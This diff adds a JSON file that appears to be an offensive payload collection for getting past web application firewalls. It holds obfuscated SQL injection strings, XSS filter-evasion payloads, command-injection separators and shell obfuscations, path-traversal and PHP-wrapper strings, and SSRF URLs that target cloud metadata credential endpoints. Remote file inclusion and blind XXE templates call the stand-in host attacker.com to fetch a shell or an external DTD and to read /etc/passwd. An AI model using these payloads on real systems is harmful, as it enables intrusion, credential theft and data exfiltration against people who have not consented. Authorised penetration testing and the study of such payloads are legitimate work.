@@ -1,0 +1,189 @@
+{
+  "WAF_BYPASS_TECHNIQUES": {
+    "SQL_INJECTION": {
+      "comment_based": [
+        "UN/**/ION SEL/**/ECT",
+        "/*!50000UNION*/ /*!50000SELECT*/",
+        "/*!40000UNION*/ /*!40000SELECT*/",
+        "UN%4C%49%4fN SEL%45%43T",
+        "/*!UNION*/ /*!SELECT*/",
+        "%23%0aUNION%20SELECT%20"
+      ],
+      "case_mutation": [
+        "UnIoN SeLeCtT",
+        "union select",
+        "UNION SELECT",
+        "uNiOn SeLeCt",
+        "sElEcT"
+      ],
+      "encoding": [
+        "UNION%20SELECT",
+        "UNION%09SELECT",
+        "UNION%0aeSELECT",
+        "%55%6e%69%6f%6e%20%53%65%6c%65%63%74",
+        "%2555nion %2553elect",
+        "UNION%2BSELECT",
+        "%u0055nion %u0053elect"
+      ],
+      "function_wrapping": [
+        "UNION(SELECT(1),2,3)",
+        "UNION(SELECT 1,2,3)",
+        "(SELECT(1))",
+        "CONCAT('UN','ION')"
+      ],
+      "whitespace": [
+        "UNION+SELECT",
+        "UNION/**/SELECT",
+        "UNION%0bSELECT",
+        "UNION%0cSELECT",
+        "UNION%a0SELECT"
+      ]
+    },
+    "XSS": {
+      "tag_breaking": [
+        "<scr<script>ipt>alert(1)</scr</script>ipt>",
+        "<img src=\"x\" onerror=alert(1) alt=\"",
+        "<a href=\"javascript:alert(1)\">click",
+        "\" autofocus onfocus=alert(1)//"
+      ],
+      "encoding": [
+        "<img src=x onerror\\u003dalert(1)>",
+        "<img src=x onerror=&#97;lert(1)>",
+        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+        "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E",
+        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"
+      ],
+      "event_handlers": [
+        "onmouseover",
+        "onload",
+        "onerror",
+        "onclick",
+        "onchange",
+        "onmove",
+        "onmouseenter",
+        "onmouseleave",
+        "onkeydown",
+        "onkeyup",
+        "onwheel",
+        "onfocus",
+        "onblur",
+        "ondrag"
+      ]
+    },
+    "COMMAND_INJECTION": {
+      "separators": [
+        ";",
+        "|",
+        "&",
+        "&&",
+        "||",
+        "\n",
+        "%0a",
+        "`",
+        "$(",
+        "%0d%0a"
+      ],
+      "ifs_manipulation": [
+        "${IFS}",
+        "${PATH}",
+        "${HOME}",
+        "%20",
+        "%09",
+        "<"
+      ],
+      "null_byte": [
+        "%00",
+        "\u0000"
+      ],
+      "obfuscation": [
+        "c''at",
+        "c\"\"at",
+        "c\\at",
+        "/bin/c?t",
+        "b`a`sh",
+        "$@|bash"
+      ]
+    },
+    "FILE_INCLUSION": {
+      "path_traversal": [
+        "../",
+        "..\\",
+        "..../",
+        "%2e%2e%2f",
+        "..%252f",
+        "..%c0%af",
+        "..%ef%bc%8f",
+        "%2e%2e%5c"
+      ],
+      "null_byte": [
+        "%00",
+        "\u0000"
+      ],
+      "protocols": [
+        "file://",
+        "php://",
+        "expect://",
+        "zip://",
+        "data://",
+        "glob://",
+        "phar://"
+      ],
+      "wrappers": [
+        "php://filter/read=convert.base64-encode/resource=",
+        "php://input",
+        "data:text/plain;base64,"
+      ]
+    },
+    "SSRF": {
+      "cloud_metadata": [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://[::ffff:169.254.169.254]/latest/meta-data/",
+        "http://169.254.169.254.xip.io/latest/meta-data/"
+      ],
+      "localhost_variants": [
+        "http://127.0.0.1",
+        "http://localhost",
+        "http://0.0.0.0",
+        "http://[::1]",
+        "http://127.1",
+        "http://2130706433",
+        "http://0177.0.0.1"
+      ]
+    }
+  },
+  "PAYLOAD_TEMPLATES": {
+    "SQL_INJECTION_TEST": {
+      "union": "' UNION SELECT 1,2,3 -- -",
+      "error": "' AND extractvalue(rand(), concat(0x3a, version())) -- -",
+      "blind_time": "' AND SLEEP(5) -- -",
+      "blind_boolean": "' AND '1'='1"
+    },
+    "XSS_TEST": {
+      "basic": "<script>alert(1)</script>",
+      "event": "<img src=x onerror=alert(1)>",
+      "svg": "<svg onload=alert(1)>",
+      "javascript_uri": "javascript:alert(1);"
+    },
+    "COMMAND_INJECTION_TEST": {
+      "semicolon": "; id ;",
+      "pipe": "| id",
+      "logical": "&& id",
+      "newline": "\nid"
+    },
+    "FILE_INCLUSION_TEST": {
+      "lfi": "../../../../etc/passwd",
+      "rfi": "http://attacker.com/shell.php",
+      "lfi_windows": "..\\..\\..\\..\\windows\\win.ini"
+    },
+    "SSRF_TEST": {
+      "aws": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "gcp": "http://metadata.google.internal/computeMetadata/v1/",
+      "azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+      "internal_port": "http://127.0.0.1:22"
+    },
+    "XXE_TEST": {
+      "basic": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY file SYSTEM \"file:///etc/passwd\"> ]><data>&file;</data>",
+      "blind": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd; ]><data></data>"
+    }
+  }
+}
